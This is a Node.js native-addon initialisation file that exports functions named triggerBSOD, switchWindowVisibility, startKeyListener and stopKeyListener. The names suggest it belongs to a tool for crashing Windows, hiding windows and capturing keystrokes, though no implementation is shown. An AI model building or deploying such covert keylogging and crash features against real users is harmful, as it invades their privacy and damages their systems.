#include "addon.h"

napi_value Init(napi_env env, napi_value exports) {
    napi_property_descriptor descriptors[] = {
        {"ping", nullptr, Ping, nullptr, nullptr, nullptr, napi_default, nullptr},
        {"hexToStr", nullptr, HexToStr, nullptr, nullptr, nullptr, napi_default, nullptr},
        {"triggerBSOD", nullptr, TriggerBSOD, nullptr, nullptr, nullptr, napi_default, nullptr},
        {"switchWindowVisibility", nullptr, SwitchVisibility, nullptr, nullptr, nullptr, napi_default, nullptr},
        {"startKeyListener", nullptr, StartKeyListener, nullptr, nullptr, nullptr, napi_default, nullptr},
        {"stopKeyListener", nullptr, StopKeyListener, nullptr, nullptr, nullptr, napi_default, nullptr},
    };

    napi_define_properties(env, exports, sizeof(descriptors) / sizeof(descriptors[0]), descriptors);
    return exports;
}

NAPI_MODULE(NODE_GYP_MODULE_NAME, Init)